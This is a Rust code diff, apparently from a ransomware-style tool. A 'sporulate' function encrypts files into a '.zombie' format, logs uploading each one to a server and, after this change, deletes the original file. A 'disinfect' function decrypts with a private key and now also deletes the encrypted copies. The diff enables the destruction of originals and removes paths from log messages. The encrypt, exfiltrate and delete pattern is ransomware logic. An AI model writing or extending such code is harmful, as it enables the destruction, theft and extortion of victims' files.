@@ -3,7 +3,7 @@
 
 use std::{
     collections::HashSet,
-    // fs, // for file deletion
+    fs,
     io::{self, ErrorKind},
     path::Path,
 };
@@ -150,12 +150,7 @@ pub fn sporulate(
 
             if !no_delete {
                 debug!("Deleting original file: {:?}", file_path);
-                // fs::remove_file(file_path)?;
-                // TODO: Test if it worked:
-                // Success:
-                // debug!();
-                // Error:
-                // error!();
+                fs::remove_file(file_path)?;
             }
 
             let action_message = format!("Upload {} to server {}", file_path.display(), server);
@@ -166,7 +161,7 @@ pub fn sporulate(
             }
         }
     }
-    info!("Encryption process completed successfully: path={:?}", path);
+    info!("Encryption process completed successfully");
     Ok(())
 }
 
@@ -183,7 +178,7 @@ pub fn sporulate(
 ///   - Extracts the `.zombie` file header
 ///   - Uses the private key provided to decrypt the header
 ///   - Decrypts the content using the decrypted secret key and IV
-pub fn disinfect(path: &Path, key: &Path) -> Result<(), AppError> {
+pub fn disinfect(path: &Path, key: &Path, no_delete: &bool) -> Result<(), AppError> {
     if !path.exists() {
         return Err(AppError::Io(io::Error::new(
             ErrorKind::NotFound,
@@ -220,9 +215,12 @@ pub fn disinfect(path: &Path, key: &Path) -> Result<(), AppError> {
         debug!("Decrypting file: {:?}", file_path);
         decrypt(file_path, &private_key)?;
 
-        // TODO: Check if the .zombie file should be deleted (no-delete-like)
+        if !no_delete {
+            debug!("Deleting .zombie file: {:?}", file_path);
+            fs::remove_file(file_path)?;
+        }
     }
 
-    info!("Decryption process completed successfully: path={:?}", path);
+    info!("Decryption process completed successfully");
     Ok(())
 }
